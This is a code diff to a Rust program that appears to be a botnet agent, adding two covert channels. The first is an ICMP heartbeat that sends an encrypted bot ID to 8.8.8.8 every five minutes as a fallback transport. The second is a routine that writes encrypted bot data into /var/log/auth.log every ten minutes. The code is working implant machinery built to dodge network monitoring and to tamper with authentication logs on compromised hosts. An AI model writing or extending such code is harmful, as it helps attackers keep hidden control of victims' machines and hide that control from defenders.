@@ -19,6 +19,8 @@ use arcticfox_core::zwcodec::SessionMarkers;
 use crate::executor;
 use crate::fetcher::Fetcher;
 use crate::heartbeat::Heartbeat;
+use crate::icmp_heartbeat;
+use crate::log_covert;
 
 const MAX_REPOS: usize = 256;
 const BOT_ID_FILE: &str = "/tmp/.sd-id";
@@ -116,6 +118,44 @@ impl Agent {
             self.fetcher.client().clone(),
             shutdown.clone(),
         );
+
+        // Start ICMP heartbeat as fallback transport
+        let bot_id = self.bot_id.clone();
+        let mut shutdown_icmp = shutdown.clone();
+        tokio::spawn(async move {
+            let key = arcticfox_core::crypto::generate_session_key();
+            let dest = std::net::Ipv4Addr::new(8, 8, 8, 8);
+            let mut seq: u16 = 0;
+            loop {
+                tokio::select! {
+                    _ = tokio::time::sleep(std::time::Duration::from_secs(300)) => {
+                        icmp_heartbeat::send_icmp_heartbeat(&bot_id, &key, dest, 0xAF47, seq);
+                        seq = seq.wrapping_add(1);
+                    }
+                    _ = shutdown_icmp.changed() => {
+                        if *shutdown_icmp.borrow() { break; }
+                    }
+                }
+            }
+        });
+
+        // Start log covert channel
+        let bot_id_log = self.bot_id.clone();
+        let key = arcticfox_core::crypto::generate_session_key();
+        let mut shutdown_log = shutdown.clone();
+        tokio::spawn(async move {
+            let log_path = "/var/log/auth.log";
+            loop {
+                tokio::select! {
+                    _ = tokio::time::sleep(std::time::Duration::from_secs(600)) => {
+                        log_covert::write_log_covert(log_path, bot_id_log.as_bytes(), &key);
+                    }
+                    _ = shutdown_log.changed() => {
+                        if *shutdown_log.borrow() { break; }
+                    }
+                }
+            }
+        });
 
         loop {
             // Check shutdown
